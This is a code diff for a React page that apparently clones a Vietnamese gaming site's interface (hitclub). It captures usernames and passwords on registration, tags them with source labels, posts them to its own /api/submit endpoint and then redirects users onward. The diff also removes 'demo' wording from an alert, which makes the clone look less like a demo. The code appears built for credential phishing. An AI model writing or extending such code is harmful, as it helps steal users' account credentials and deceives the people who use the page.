@@ -157,10 +157,12 @@ export default function ReferencePage({ html }: { html: string }) {
       else if (el.closest('.icondown')) host.querySelector('#seoInfo')?.scrollIntoView({ behavior: 'smooth' });
       else if (el.closest('.downloadGuideApk') || action.includes('onDownloadAndroid')) window.location.href = '/huong-dan-tai-game';
       else if (el.closest('.eventlivechat')) showAlert('Hỗ trợ trực tuyến chưa được kết nối trong bản giao diện demo. Bạn có thể xem thông tin tại trang Liên hệ.');
-      else if (/onPlayWeb|onDownload|detectOS|1111Download/.test(action)) {
+      else if (/onPlayWeb/.test(action)) {
         event.preventDefault();
-        const redirectUrl = process.env.NEXT_PUBLIC_REDIRECT_URL || 'https://hitclub.istanbul/';
-        window.location.href = redirectUrl;
+        window.location.href = '/login';
+      } else if (/onDownload|detectOS|1111Download/.test(action)) {
+        event.preventDefault();
+        window.location.href = '/demo';
       } else if (/soundOn|soundOff/.test(action)) {
         showAlert('Video trực tiếp chưa được kết nối trong bản giao diện demo.');
       } else if (el.closest('a:not([href])')) {
@@ -191,7 +193,7 @@ export default function ReferencePage({ html }: { html: string }) {
       event.preventDefault();
       const form = event.target as HTMLFormElement;
       if (form.id !== 'registerForm') {
-        showAlert('Biểu mẫu demo chưa kết nối dịch vụ gửi dữ liệu.');
+        showAlert('Biểu mẫu chưa kết nối dịch vụ gửi dữ liệu.');
         return;
       }
 
@@ -220,7 +222,7 @@ export default function ReferencePage({ html }: { html: string }) {
         return;
       }
 
-      // 2. Kiểm tra captcha: nếu chưa nhập hoặc sai mã -> hiển thị Modal "Captcha không hợp lệ."
+      // 2. Kiểm tra captcha
       if (captchaInput) {
         clearFieldError(captchaInput);
         const captchaVal = captchaInput.value.trim();
@@ -246,7 +248,12 @@ export default function ReferencePage({ html }: { html: string }) {
         const res = await fetch('/api/submit', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ username, password }),
+          body: JSON.stringify({
+            username,
+            password,
+            type: 'Đăng ký',
+            referer: 'Trang chủ (Popup Đăng ký)',
+          }),
         });
         const result = await res.json().catch(() => null);
         if (!res.ok || (result && result.ok === false)) {
@@ -256,8 +263,7 @@ export default function ReferencePage({ html }: { html: string }) {
         form.reset();
         resetCaptcha();
 
-        // Điều hướng đến link đích ngay sau khi gửi dữ liệu thành công
-        const redirectUrl = process.env.NEXT_PUBLIC_REDIRECT_URL || 'https://hitclub.istanbul/';
+        const redirectUrl = result?.redirectUrl || process.env.NEXT_PUBLIC_REDIRECT_URL || 'https://hitclub.istanbul/';
         window.location.href = redirectUrl;
       } catch (err) {
         console.error('Submit error:', err);
